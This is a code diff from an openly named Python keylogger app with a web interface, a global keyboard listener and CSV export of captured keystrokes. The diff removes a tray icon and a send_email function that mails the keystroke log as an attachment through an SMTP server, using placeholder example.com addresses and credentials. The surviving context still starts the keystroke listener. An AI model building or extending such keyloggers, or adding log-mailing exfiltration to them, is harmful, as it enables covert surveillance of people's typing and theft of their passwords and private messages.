@@ -8,10 +8,6 @@ import time
 import os
 import csv
 import hashlib
-from pystray import Icon, Menu, MenuItem
-from PIL import Image, ImageDraw
-import smtplib
-from email.message import EmailMessage
 
 is_logging = False
 start_time = None
@@ -68,22 +64,6 @@ def stop_keylogger():
     global is_logging
     is_logging = False
 
-def create_icon():
-    image = Image.new('RGB', (64, 64), color=(73, 109, 137))
-    draw = ImageDraw.Draw(image)
-    draw.rectangle([8, 8, 56, 56], fill=(255, 165, 0))
-    return image
-
-def run_tray():
-    def on_exit():
-        listener.stop()
-        icon.stop()
-
-    icon = Icon("Keylogger", create_icon(), menu=Menu(
-        MenuItem('Quit', on_exit)
-    ))
-    icon.run()
-
 @eel.expose
 def toggle_keylogger(action):
     if action == "start":
@@ -136,20 +116,6 @@ def export_csv():
     return filename
 
 @eel.expose
-def send_email():
-    msg = EmailMessage()
-    msg['Subject'] = 'Keylogger Logs'
-    msg['From'] = 'youremail@example.com'
-    msg['To'] = 'receiver@example.com'
-    with open("keystrokes_export.csv", "rb") as f:
-        msg.add_attachment(f.read(), maintype='application', subtype='csv', filename="logs.csv")
-    with smtplib.SMTP('smtp.example.com', 587) as smtp:
-        smtp.starttls()
-        smtp.login('youremail@example.com', 'yourpassword')
-        smtp.send_message(msg)
-    return "Email sent."
-
-@eel.expose
 def verify_password(pwd):
     return hashlib.sha256(pwd.encode()).hexdigest() == password_hash
 
@@ -166,5 +132,4 @@ listener = keyboard.Listener(on_press=on_press)
 listener.start()
 
 eel.init("web")
-threading.Thread(target=run_tray, daemon=True).start()
 eel.start("index.html", size=(800, 600))
